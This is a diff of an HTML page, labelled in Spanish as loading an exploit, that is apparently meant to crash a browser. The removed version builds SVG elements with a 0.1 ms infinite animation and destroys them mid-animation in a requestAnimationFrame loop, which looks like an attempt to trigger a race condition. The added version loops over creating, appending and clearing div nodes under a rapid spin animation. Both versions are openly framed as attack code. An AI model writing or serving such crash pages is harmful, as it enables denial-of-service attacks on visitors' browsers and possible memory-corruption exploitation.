@@ -2,44 +2,42 @@
 <html>
 <head>
 <style>
-@keyframes crash {
+@keyframes spin {
   from { transform: rotate(0deg); }
   to { transform: rotate(360deg); }
+}
+div {
+  animation: spin 0.1ms infinite;
 }
 </style>
 </head>
 <body>
-<svg id="svg" width="100" height="100"></svg>
-<div id="log" style="background:#111;color:#0f0;font-family:monospace;padding:1em;">Cargando exploit...</div>
+<div id="log" style="background:#111;color:#0f0;padding:1em;font-family:monospace;">
+Cargando exploit... (esto puede tardar unos segundos)
+</div>
+<div id="target"></div>
 
 <script>
-const svg = document.getElementById("svg");
 const log = document.getElementById("log");
+const target = document.getElementById("target");
 
-function createMaliciousElement() {
-    let g = document.createElementNS("http://www.w3.org/2000/svg", "g");
-    g.setAttribute("transform", "translate(0,0)");
-
-    let use = document.createElementNS("http://www.w3.org/2000/svg", "use");
-    use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target");
-
-    g.appendChild(use);
-    svg.appendChild(g);
-
-    // Animación forzada
-    g.style.animation = "crash 0.1ms infinite";
-}
-
-function triggerRace() {
+function crash() {
+  try {
     for (let i = 0; i < 1000; i++) {
-        createMaliciousElement();
-        svg.innerHTML = ""; // destruir nodos en medio de la animación
+      let node = document.createElement("div");
+      node.textContent = i;
+      target.appendChild(node.cloneNode(true));
     }
+    target.innerHTML = "";
+  } catch (e) {
+    log.textContent = "Error: " + e.message;
+  }
 
-    requestAnimationFrame(triggerRace);
+  requestAnimationFrame(crash);
 }
 
-triggerRace();
+requestAnimationFrame(crash);
 </script>
 </body>
 </html>
+
